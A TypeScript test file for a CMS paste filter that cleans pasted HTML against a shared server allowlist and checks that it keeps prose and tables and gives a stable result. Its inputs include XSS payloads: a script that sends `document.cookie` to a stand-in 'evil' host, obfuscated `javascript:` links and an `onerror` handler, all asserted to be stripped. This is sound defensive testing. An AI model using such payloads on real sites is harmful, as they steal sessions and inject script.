/**
 * What a paste may put into a body, and the one allowlist three doors read.
 *
 * #246 opened with *"still cms has HTML tags apear in editors"* and the fix was a surface that
 * shows no markup; `tests/block-editor.test.ts` holds that surface to account. This file is about
 * the half of that promise a surface cannot keep on its own: the words a person pastes from Word,
 * from an email client or from the site's own page have to arrive as prose the server will accept,
 * or the body they see is not the body that saves.
 *
 *   - **the paste filter is the server's allowlist, read in a browser.** Not a second opinion
 *     about what HTML is fine: the same three lists, imported. A cleaner that disagrees with
 *     `sanitizeRichHtml()` either eats words the person pasted or lets a body change when it is
 *     saved.
 *   - **it settles.** `cleanPaste(cleanPaste(x))` is `cleanPaste(x)`, the same fixed-point
 *     discipline `plainText()` follows, because a filter applied on read and on write has to
 *     stop changing its own answer.
 *
 * The editor's own document model is deliberately not tested here: it is a schema, and the proof
 * that it carries the corpus is in `tests/block-roundtrip.test.ts`.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

import { cleanPaste } from '../src/lib/console/paste-filter';
import { isAllowedHref, RICH_ALLOWED_TAGS } from '../src/lib/content/rich-policy';

const read = (...parts: string[]): string => readFileSync(join(process.cwd(), ...parts), 'utf8');

const filterSource = read('src', 'lib', 'console', 'paste-filter.ts');
const engineSource = read('src', 'lib', 'content', 'rich.ts');
const outSource = read('src', 'lib', 'wp', 'sanitize.ts');

describe('a paste keeps the words and loses the markup nobody allowed', () => {
  it('keeps the prose the site itself prints, class and all', () => {
    const body = '<p class="wp-block-paragraph">ديرما بن <strong>للشعر</strong></p>';
    expect(cleanPaste(body)).toBe(body);
  });

  it('keeps a table whole, because a block model would have to throw it away', () => {
    const table = '<table><tbody><tr><td>a</td><th scope="x">b</th></tr></tbody></table>';
    expect(cleanPaste(table)).toBe('<table><tbody><tr><td>a</td><th>b</th></tr></tbody></table>');
  });

  it('discards a script with its contents, not as a sentence', () => {
    const out = cleanPaste('<p>keep</p><script>fetch("//evil/?c="+document.cookie)</script>');
    expect(out).toBe('<p>keep</p>');
    expect(out).not.toMatch(/fetch|evil|document/i);
  });

  it('strips an inline style and keeps the element it was hung on', () => {
    expect(cleanPaste('<span style="position:fixed;inset:0" class="note">words</span>')).toBe('<span class="note">words</span>');
  });

  it('drops a `javascript:` address and the words around it survive', () => {
    const out = cleanPaste('<a href="javascript:alert(1)" title="t">click</a>');
    expect(out).toBe('<a title="t">click</a>');
  });

  it('does not read a scheme that has been padded with whitespace or a newline', () => {
    expect(isAllowedHref('java\nscript:alert(1)')).toBe(false);
    expect(isAllowedHref(' javascript:alert(1)')).toBe(false);
    expect(cleanPaste('<a href="java\nscript:alert(1)">x</a>')).toBe('<a>x</a>');
    // The entity is what an email client actually sends, and the attribute is decoded before it
    // is judged — so the same refusal has to hold after `&#09;` becomes a tab.
    expect(cleanPaste('<a href="java&#09;script:alert(1)">x</a>')).toBe('<a>x</a>');
    expect(cleanPaste('<a href="&#106;avascript:alert(1)">x</a>')).toBe('<a>x</a>');
  });

  it('drops an event handler an image arrived with, and keeps the picture', () => {
    expect(cleanPaste('<img src="/uploads/202610/a.webp" onerror="alert(1)" alt="a">')).toBe('<img src="/uploads/202610/a.webp" alt="a">');
  });

  it('makes a new tab unreachable from the tab that opened it', () => {
    expect(cleanPaste('<a href="/a" target="_blank">x</a>')).toBe('<a href="/a" target="_blank" rel="noopener noreferrer">x</a>');
  });

  it('keeps the text of a tag nobody knows instead of eating the sentence', () => {
    expect(cleanPaste('<marquee>the words</marquee>')).toBe('the words');
  });

  it('leaves a comment out of the body', () => {
    expect(cleanPaste('<p>a</p><!-- TODO b -->')).toBe('<p>a</p>');
  });

  it('treats a person’s less-than as the text it is', () => {
    const prose = '12 < 15 and <3 — no tag here';
    expect(cleanPaste(prose)).toBe(prose);
  });

  it('reads a quoted attribute containing a bracket as one attribute', () => {
    expect(cleanPaste('<a href="/x" title="a > b">x</a>')).toBe('<a href="/x" title="a > b">x</a>');
    // …and the same parse is what refuses `title` on a paragraph: the policy gives it to `a`
    // and `img` only, so a token the scanner had cut in half could not have been refused at all.
    expect(cleanPaste('<p title="a > b">x</p>')).toBe('<p>x</p>');
  });

  it('settles, so a filter on read and a filter on write cannot shave the same body twice', () => {
    const messy = '<div style="x"><script>evil()</script><a href="javascript:1">keep <b>me</b></a></div>';
    const once = cleanPaste(messy);
    expect(cleanPaste(once)).toBe(once);
  });

  it('answers an empty body with an empty body', () => {
    expect(cleanPaste('')).toBe('');
  });
});

describe('one allowlist, three doors', () => {
  it('is defined once and imported everywhere', () => {
    expect(engineSource).toContain("from './rich-policy'");
    expect(outSource).toContain('from "../content/rich-policy"');
    expect(filterSource).toContain("from '@/lib/content/rich-policy'");
    // The engine file no longer owns the list, so it cannot be the only place it is written down.
    expect(engineSource).not.toMatch(/export const RICH_ALLOWED_TAGS/);
  });

  it('leaves the paste filter no private copy of the tag list', () => {
    expect(filterSource).not.toMatch(/'p', 'br'/);
    expect(filterSource).not.toMatch(/allowedTags:/);
    expect(filterSource).not.toMatch(/allowedAttributes:/);
  });

  it('keeps every tag the policy allows and refuses one it does not', () => {
    for (const tag of ['p', 'h2', 'ul', 'li', 'blockquote', 'a', 'img', 'table', 'td', 'strong', 'span', 'div']) {
      expect(RICH_ALLOWED_TAGS).toContain(tag);
      const open = tag === 'img' ? `<img src="${'/uploads/a.webp'}">` : `<${tag}>words</${tag}>`;
      expect(cleanPaste(open), `${tag} survives`).toContain(`<${tag}`);
    }
    for (const gone of ['script', 'style', 'iframe', 'form', 'svg', 'object', 'marquee', 'h1']) {
      expect(RICH_ALLOWED_TAGS, `${gone} is not allowed`).not.toContain(gone);
      expect(cleanPaste(`<${gone}>words</${gone}>`), `${gone} goes`).not.toContain(`<${gone}`);
    }
  });
});
